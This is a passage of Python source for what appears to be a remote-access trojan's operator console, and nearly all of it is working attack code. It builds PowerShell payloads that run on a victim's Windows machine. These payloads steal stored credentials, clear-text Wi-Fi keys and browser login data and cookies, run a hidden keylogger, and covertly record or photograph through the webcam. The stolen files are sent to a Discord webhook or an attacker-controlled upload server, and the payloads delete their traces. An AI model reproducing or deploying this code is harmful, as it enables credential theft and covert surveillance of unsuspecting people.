                    "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
                    "$d=\"$env:TEMP\\dump_$ts\";"
                    "New-Item -ItemType Directory $d -Force|Out-Null;"
                    "$osi=Get-WmiObject Win32_OperatingSystem;"
                    "$cpu=(Get-WmiObject Win32_Processor|Select-Object -First 1).Name;"
                    "@('=== SYSTEM INFO ===',\"Host: $env:COMPUTERNAME\",\"User: $env:USERNAME\","
                    "\"OS: $($osi.Caption)\",\"CPU: $cpu\","
                    "\"RAM: $([Math]::Round($osi.TotalVisibleMemorySize/1MB,2)) GB\")"
                    "|Out-File \"$d\\sysinfo.txt\" -Encoding UTF8;"
                    "cmdkey /list|Out-File \"$d\\credman.txt\" -Encoding UTF8;"
                    "$w=@();netsh wlan show profiles|Select-String 'All User Profile'|ForEach-Object{"
                    "$n=($_ -split ':',2)[1].Trim();"
                    "$raw=(& cmd /c \"netsh wlan show profile name=`\"$n`\" key=clear\") -join \"`n\";"
                    "$key=if($raw -match 'Key Content\\s+:\\s+(.+)'){$Matches[1].Trim()}else{'(none)'};"
                    "$w+= \"$n - $key\"};"
                    "$w|Out-File \"$d\\wifi.txt\" -Encoding UTF8;"
                    "$bd=\"$d\\browsers\";New-Item -ItemType Directory $bd -Force|Out-Null;"
                    "@{Chrome=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\";"
                    "Edge=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\"}.GetEnumerator()|ForEach-Object{"
                    "if(Test-Path $_.Value){"
                    "$dst=\"$bd\\$($_.Key)\";New-Item -ItemType Directory $dst -Force|Out-Null;"
                    "foreach($f in @('Login Data','Cookies','History')){$fp=\"$($_.Value)\\$f\";"
                    "if(Test-Path $fp){Copy-Item $fp \"$dst\\$f\" -Force}}}};"
                    "$zip=\"$env:TEMP\\dump_$ts.zip\";"
                    "Compress-Archive -Path $d -DestinationPath $zip -Force;"
                    "$szMB=[Math]::Round((Get-Item $zip).Length/1MB,2);"
                    f"_DU '{whu}' $zip;"
                    "Remove-Item $d -Recurse -Force -EA 0;Remove-Item $zip -Force -EA 0;"
                    "Write-Output \"[+] Dump sent to Discord ($szMB MB).\""
                )
                print(_send(ps, timeout=180.0))
                continue

            # key-capture
            if c == "key-capture":
                print("[*] Starting background keylogger...")
                ps = (
                    "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
                    "$log=\"$env:TEMP\\kl_$ts.txt\";"
                    "$sb={"
                    "param($lp);"
                    "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;"
                    "public class KL2{"
                    "[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int k);"
                    "[DllImport(\"user32.dll\")]public static extern short GetKeyState(int k);}' -EA 0;"
                    "$sm=@{48=')';49='!';50='@';51='#';52='$';53='%';54='^';55='&';56='*';57='(';"
                    "186=':';187='+';188='<';189='_';190='>';191='?';192='~';219='{';220='|';221='}';222='\"'};"
                    "$nm=@{186=';';187='=';188=',';189='-';190='.';191='/';192='`';219='[';220='\\\\';221=']';222=\"'\"};"
                    "while($true){Start-Sleep -Milliseconds 30;"
                    "for($i=8;$i -le 222;$i++){if([KL2]::GetAsyncKeyState($i) -band 0x0001){"
                    "$sh=[KL2]::GetKeyState(16) -band 0x8000;"
                    "$ca=[KL2]::GetKeyState(20) -band 0x0001;"
                    "$ch=$null;"
                    "if($i -eq 13){$ch=\"\\r\\n\"}"
                    "elseif($i -eq 32){$ch=' '}"
                    "elseif($i -eq 8){$ch='[BS]'}"
                    "elseif($i -eq 9){$ch='[TAB]'}"
                    "elseif($i -eq 46){$ch='[DEL]'}"
                    "elseif($i -ge 65 -and $i -le 90){$ch=if($sh -bxor $ca){[char]$i}else{[char]($i+32)}}"
                    "elseif($i -ge 48 -and $i -le 57){$ch=if($sh){$sm[$i]}else{[char]$i}}"
                    "elseif($i -ge 96 -and $i -le 105){$ch=[char]($i-48)}"
                    "elseif($sm.ContainsKey($i)){$ch=if($sh){$sm[$i]}else{$nm[$i]}};"
                    "if($ch -ne $null){[System.IO.File]::AppendAllText($lp,[string]$ch)}}}};"
                    "$j=Start-Job -ScriptBlock $sb -ArgumentList $log;"
                    "\"$($j.Id)|$log\"|Set-Content \"$env:TEMP\\kl_job.txt\";"
                    "Write-Output \"[+] Keylogger started (Job $($j.Id)). Type exit-capture to stop.\""
                )
                print(_send(ps, timeout=20.0))
                continue

            # exit-capture
            if c == "exit-capture":
                print("[*] Stopping keylogger and uploading log...")
                lh, lp = LHOST, LPORT
                ps = (
                    "if(-not(Test-Path \"$env:TEMP\\kl_job.txt\")){Write-Output '[-] No keylogger running.'}else{"
                    "$parts=(Get-Content \"$env:TEMP\\kl_job.txt\").Split('|');"
                    "$jId=[int]$parts[0];$lpath=$parts[1];"
                    "Stop-Job -Id $jId -EA 0;Remove-Job -Id $jId -Force -EA 0;"
                    "Remove-Item \"$env:TEMP\\kl_job.txt\" -Force -EA 0;"
                    "if(Test-Path $lpath){"
                    f"(New-Object System.Net.WebClient).UploadFile('http://{lh}:{lp}/upload',$lpath);"
                    "Remove-Item $lpath -Force -EA 0;"
                    "Write-Output '[+] Keylog uploaded → ./exfil/'"
                    "}else{Write-Output '[-] No log file found.'}}"
                )
                print(_send(ps, timeout=30.0))
                continue

            # livecam (help)
            if c == "livecam":
                print("\n  livecam sub-commands:")
                print("    livecam-start  — start hidden webcam recording")
                print("    livecam-stop   — stop + send to Discord webhook")
                print("    livecam-save   — stop + save to ./recordings/")
                continue

            # livecam-start
            if c == "livecam-start":
                print("[*] Starting webcam recording on target...")
                b64 = _LC_B64
                ps = (
                    "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
                    "$avi=\"$env:TEMP\\lc_$ts.avi\";"
                    "$flag=\"$env:TEMP\\lc_stop.flag\";"
                    "Remove-Item $flag -EA 0;"
                    "$sp=\"$env:TEMP\\lc_cap.ps1\";"
                    f"[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{b64}'))|Set-Content $sp -Encoding Unicode;"
                    "$proc=Start-Process \"$env:windir\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\" -ArgumentList \"-NoP -NonI -STA -ExecutionPolicy Bypass -File `\"$sp`\" `\"$avi`\" `\"$flag`\"\" -PassThru -WindowStyle Hidden;"
                    "\"$($proc.Id)|$avi\"|Set-Content \"$env:TEMP\\lc_job.txt\";"
                    "Write-Output \"[+] Recording started (PID $($proc.Id)). Use livecam-stop or livecam-save.\""
                )
                print(_send(ps, timeout=20.0))
                continue

            # livecam-stop
            if c == "livecam-stop":
                whu = _ask_webhook()
                if not whu:
                    continue
                print("[*] Stopping recording and uploading to Discord...")
                ps = (
                    _DISCORD_UPLOAD +
                    "if(-not(Test-Path \"$env:TEMP\\lc_job.txt\")){Write-Output '[-] No livecam session.'}else{"
                    "$parts=(Get-Content \"$env:TEMP\\lc_job.txt\").Split('|');"
                    "$cpid=[int]$parts[0];$avi=$parts[1];"
                    "'stop'|Set-Content \"$env:TEMP\\lc_stop.flag\";"
                    "Start-Sleep -Seconds 6;"
                    "$pp=Get-Process -Id $cpid -EA 0;"
                    "if($pp -and -not $pp.WaitForExit(10000)){Stop-Process -Id $cpid -Force -EA 0;Start-Sleep -Seconds 2};"
                    "Start-Sleep -Seconds 1;"
                    "Remove-Item \"$env:TEMP\\lc_job.txt\",\"$env:TEMP\\lc_stop.flag\",\"$env:TEMP\\lc_cap.ps1\" -Force -EA 0;"
                    "if(Test-Path $avi){"
                    "$szMB=[Math]::Round((Get-Item $avi).Length/1MB,2);"
                    f"_DU '{whu}' $avi;"
                    "Remove-Item $avi -Force -EA 0;"
                    "Write-Output \"[+] Recording uploaded to Discord ($szMB MB).\""
                    "}else{Write-Output '[-] AVI file not found.'}}"
                )
                print(_send(ps, timeout=60.0))
                continue

            # livecam-save
            if c == "livecam-save":
                print("[*] Stopping recording and saving locally...")
                lh, lp = LHOST, LPORT
                ps = (
                    "if(-not(Test-Path \"$env:TEMP\\lc_job.txt\")){Write-Output '[-] No livecam session.'}else{"
                    "$parts=(Get-Content \"$env:TEMP\\lc_job.txt\").Split('|');"
                    "$cpid=[int]$parts[0];$avi=$parts[1];"
                    "'stop'|Set-Content \"$env:TEMP\\lc_stop.flag\";"
                    "Start-Sleep -Seconds 6;"
                    "$pp=Get-Process -Id $cpid -EA 0;"
                    "if($pp -and -not $pp.WaitForExit(10000)){Stop-Process -Id $cpid -Force -EA 0;Start-Sleep -Seconds 2};"
                    "Start-Sleep -Seconds 1;"
                    "Remove-Item \"$env:TEMP\\lc_job.txt\",\"$env:TEMP\\lc_stop.flag\",\"$env:TEMP\\lc_cap.ps1\" -Force -EA 0;"
                    "if(Test-Path $avi){"
                    f"(New-Object System.Net.WebClient).UploadFile('http://{lh}:{lp}/upload',$avi);"
                    "Remove-Item $avi -Force -EA 0;"
                    "Write-Output '[+] Recording saved → ./recordings/'"
                    "}else{Write-Output '[-] AVI file not found.'}}"
                )
                print(_send(ps, timeout=60.0))
                continue

            # pic — single webcam snapshot
            if c == "pic":
                print("[*] Activating camera (2 s warm-up)...")
                whu_raw = input("[?] Discord webhook URL (Enter to save locally): ").strip()
                lh, lp = LHOST, LPORT
                b64 = _PIC_B64
                common = (
                    "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
                    "$bmp=\"$env:TEMP\\pic_$ts.bmp\";"
                    "$done=\"$env:TEMP\\pic_done.flag\";"
                    "$png=\"$env:TEMP\\pic_$ts.png\";"
                    "Remove-Item $done -Force -EA 0;"
                    "$sp=\"$env:TEMP\\pic_cap.ps1\";"
                    f"[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{b64}'))|Set-Content $sp -Encoding Unicode;"
                    f"Start-Process \"$env:windir\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\" -ArgumentList \"-NoP -NonI -STA -ExecutionPolicy Bypass -File `\"$sp`\" `\"$bmp`\" `\"$done`\"\" -WindowStyle Hidden;"
                    "$i=0;while(-not(Test-Path $done) -and $i -lt 40){Start-Sleep -Milliseconds 500;$i++};"
                    "Start-Sleep -Milliseconds 500;"
                    "if((Test-Path $bmp) -and (Get-Item $bmp).Length -gt 0){"
                    "Add-Type -AssemblyName System.Drawing;"
                    "$img=[System.Drawing.Image]::FromFile($bmp);"
                    "$img.Save($png,[System.Drawing.Imaging.ImageFormat]::Png);"
                    "$img.Dispose();"
                )
                if whu_raw:
                    ps = (
                        _DISCORD_UPLOAD +
                        common +
                        f"_DU '{whu_raw}' $png;"
                        "Remove-Item $bmp,$png,$done,$sp -Force -EA 0;"
                        "Write-Output '[+] Photo sent to Discord.'"
                        "}else{Write-Output '[-] No camera — check driver is installed.'}"
                    )
                else:
                    ps = (
                        common +
                        f"(New-Object System.Net.WebClient).UploadFile('http://{lh}:{lp}/upload',$png)|Out-Null;"
                        "Remove-Item $bmp,$png,$done,$sp -Force -EA 0;"
                        "Write-Output '[+] Photo saved → ./images/'"
                        "}else{Write-Output '[-] No camera — check driver is installed.'}"
                    )
                print(_send_encoded(ps, timeout=30.0))
                continue

            # download <path>
            if c.startswith("download "):
                raw = cmd.split(" ", 1)[1].strip()
                if ":" in raw or raw.startswith("\\\\"):
                    tf = raw
                else:
                    sep = "" if s.cwd.endswith("\\") else "\\"
                    tf  = f"{s.cwd}{sep}{raw}"
                lh, lp = LHOST, LPORT
                sf = tf.replace("'", "''")
                ps = (
                    f"$fp='{sf}';"
                    f"if(Test-Path $fp){{(New-Object System.Net.WebClient).UploadFile('http://{lh}:{lp}/upload',$fp)|Out-Null;"
                    f"Write-Output \"[+] Sent: $fp\"}}"
                    f"else{{Write-Output \"[-] Not found: $fp\"}}"
                )
                print(_send(ps))
                continue

            # passthrough → agent IEX
            act = _active_session()
            if act:
                act.current_task = cmd
                act.task_result  = None
                result = wait_for_result(act)
                if result and result != "(no output)":
                    print(result)

    except KeyboardInterrupt:
        print("\n\n[*] Ctrl+C — shutting down ...")
    finally:
        _shutdown()
        print("[*] All sessions killed. Port 8080 released.")
        print("[*] (TIME_WAIT kernel entries clear automatically in ~60 s)")
        os._exit(0)   # hard exit — skips atexit/gc so no stray threads linger


if __name__ == "__main__":
    main()
